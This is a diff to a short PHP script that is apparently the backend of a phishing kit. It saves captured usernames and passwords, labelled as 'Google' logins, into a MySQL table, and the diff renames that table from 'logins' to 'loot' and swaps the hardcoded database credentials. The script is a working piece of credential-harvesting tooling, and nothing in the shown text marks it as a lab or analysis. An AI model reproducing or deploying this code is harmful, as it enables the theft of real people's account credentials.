@@ -1,8 +1,8 @@
 <?php
 // Database connection parameters
 $servername = "127.0.0.1";
-$username = "root";
-$password = "Password123!";
+$username = "dpuser";
+$password = "Eggy123";
 $dbname = "DPPortal";
 
 // Create connection
@@ -20,7 +20,7 @@ $service = "Google";
 $timestamp = date('Y-m-d H:i:s');
 
 // Prepare and bind
-$stmt = $conn->prepare("INSERT INTO logins (user, pass, service, datetimestamp) VALUES (?, ?, ?, ?)");
+$stmt = $conn->prepare("INSERT INTO loot (username, password, service, datetimestamp) VALUES (?, ?, ?, ?)");
 $stmt->bind_param("ssss", $user, $pass, $service, $timestamp);
 
 // Execute the query
